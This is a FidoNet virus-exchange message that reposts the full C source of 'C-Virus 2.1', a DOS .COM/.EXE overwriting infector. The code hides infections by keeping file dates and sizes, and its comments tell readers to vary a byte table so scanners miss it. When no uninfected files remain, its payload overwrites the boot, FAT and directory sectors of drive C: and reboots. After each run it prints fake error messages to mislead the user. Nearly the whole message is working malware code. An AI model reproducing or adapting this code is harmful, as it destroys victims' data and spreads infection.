/*ฤ PVT.VIRII (2:465/65.4) ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ PVT.VIRII ฤ
 Msg  : 38 of 54
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:15
 To   : -  *.*  -                                           Fri 11 Nov 94 08:10
 Subj : CVIRUS21.C
ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
.RealName: Max Ivanov
อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: ญไฎpฌ ๆจ๏ ฎ ขจpใแ ๅ)
* From : Clif Jessop, 2:283/718 (06 Nov 94 17:40)
* To   : Mike Salvino
* Subj : CVIRUS21.C
อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Clif.Jessop@f718.n283.z2.fidonet.org
  C-Virus:  A generic .COM and .EXE infector
    Written by Nowhere Man
    October 2, 1991
    Version 2.1
  */

#include <dir.h>
#include <dos.h>
#include <fcntl.h>
#include <io.h>
#include <stdio.h>


 /* Note that the #define TOO_SMALL is the minimum size of the .EXE or .COM
    file which CVIRUS can infect without increasing the size of the
    file. (Since this would tip off the victim to CVIRUS's presence, no
    file under this size will be infected.)  It should be set to the
    approximate size of the LZEXEd .EXE file produced from this code, but
    always a few bytes larger.  Why?  Because this way CVIRUS doesn't need
    to check itself for previous infection, saving time.

    SIGNATURE is the four-byte signature that CVIRUS checks for to prevent
    re-infection of itself.
 */

#ifdef DEBUG
#define TOO_SMALL 6000
#else
#define TOO_SMALL 4735
#endif

#define SIGNATURE "NMAN"

  /* The following is a table of random byte values.  Be sure to constantly
     change this to prevent detection by virus scanners, but keep it short
     (or non-exsistant) to keep the code size down.
  */

  char screw_virex[] = "\xF5\x23\x72\x96\x54\xFA\xE3\xBC\xCD\x04";

void hostile_activity(void)
{
  /* Put whatever you feel like doing here...
     I chose to make this routine trash the victim's boot, FAT,
     and directory sectors, but you can alter this code however you want,
     and are encouraged to do so.
  */


#ifdef DEBUG
       puts("\aAll files infected!");
       exit(1);
#else

  /* Overwrite five sectors, starting with sector 0, on C:, with the
     memory at location DS:0000 (random garbage).
  */

  abswrite(2,5,0,(void *) 0);
  __emit__(0xCD, 0x19);   // Reboot computer

#endif

}

int infected(char *fname)
{
   /* This function determines if fname is infected.  It reads four
      bytes 28 bytes in from the start and checks them agains
      the current header. 1 is returned if the file is already infected,
      0 if it isn't.
   */

      register int handle;
      char virus_signature[35];
      static char check[] = SIGNATURE;

      handle = _open(fname, O_RDONLY);
      _read(handle, virus_signature,
      sizeof(virus_signature));
      close(handle);

#ifdef DEBUG
       printf("Signature for %s: %.4s\n", fname, &virus_signature[28]);
#endif

   /* This next bit may look really stupid, but it actually saves about
      100 bytes.
   */

   return((virus_signature[30] == check[2]) && (virus_signature[31] ==
check[3]));
}

void spread(char *virus, struct ffblk *victim)
{
  /* This function infects victim with virus.  First, the victim's
     attributes are set to 0.  Then the virus is copied into the victim's
     file name.  Its attributes, file date/time, and size are set to that
     of the victim's, preventing detection, and the files are closed.
  */

  register int virus_handle, victim_handle;
  unsigned virus_size;
  char virus_code[TOO_SMALL + 1], *victim_name;

  /* This is used enought to warrant saving it in a separate variable */

  victim_name = victim->ff_name;


#ifdef DEBUG
       printf("Infecting %s with %s...\n", victim_name, virus);
#endif

     /* Turn off all of the victim's attributes so it can be replaced */

     _chmod(victim_name, 1, 0);


#ifdef DEBUG
       puts("Ok so far...");
#endif


           /* Recreate the victim */

           virus_handle = _open(virus, O_RDONLY);
           victim_handle = _creat(victim_name, victim->ff_attrib);


           /* Copy virus */

           virus_size = _read(virus_handle, virus_code, sizeof(virus_code));
           _write(victim_handle, virus_code, virus_size);

#ifdef DEBUG
       puts("Almost done...");
#endif

           /* Reset victim's file date, time, and size */

           chsize(victim_handle, victim->ff_fsize);
           setftime(victim_handle, (struct ftime *) &victim->ff_ftime);


           /* Close files */

           close(virus_handle);
           close(victim_handle);

#ifdef DEBUG
       puts("Infection complete!");
#endif
}

struct ffblk *victim(void)
{
   /* This function returns a pointer to the name of the virus's next
      victim.  This routine is set up to try to infect .EXE and .COM
      files.  If there is a command line argument, it will try to
      infect that file instead. If all files are infected, hostile
      activity is initiated...
   */

    register char **ext;
    static char *types[] = {"*.EXE", "*.COM", NULL};
    static struct ffblk ffblk;
    int done;

  for (ext = (*++_argv) ? _argv : types; *ext; ext++)
  {
    for (ext = (*++_argv) ? _argv : types; *ext; ext++)
    {
       done = findfirst(*ext, &ffblk, FA_RDONLY | FA_HIDDEN | FA_SYSTEM |
FA_ARCH);
       while (!done) {
#ifdef DEBUG
       printf("Scanning %s...\n", ffblk.ff_name);
#endif

         /* If you want to check for specific days of the week, months,
            etc.... here is the place to insert the code (don't forget to
            "#include <time.h>").
         */

       if ((ffblk.ff_fsize > TOO_SMALL) && (!infected(ffblk.ff_name)))
           return(&ffblk);

          done = findnext(&ffblk);
        }
     }
   }
     /* If there are no files left to infect, have a little fun */

     hostile_activity();
     return(0);
}

int main(int argc, char *argv[])
{
    /* In the main program, a victim is found and infected. If all files
       are infected, a malicious action is performed.  Otherwise, a bogus
       error message is displayed, and the virus terminates with code
       1, simulating an error.
    */

  char *err_msg[] = { "Out of memory",
                      "Bad EXE format",
                      "Invalid DOS version",
                      "Bad memory block",
                      "FCB creation error",
                      "Sharing violation",
                      "Abnormal program termination",
                      "Divide error",
                    };

     char *virus_name;
     spread(argv[0], victim());
     puts(err_msg[peek(0, 0x46C) % (sizeof(err_msg) / sizeof(char *))]);
     return(1);
}

/*-+-  GEcho 1.00
 + Origin: Stop creating them! Virusses aren't great! (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    þ The MeยeO

/d            Warn if duplicate symbols in libraries

--- Aidstest Null: /Kill
 * Origin: ๙PVT.ViRII๚main๚board๚ / Virus Research labs. (2:5030/136)*/

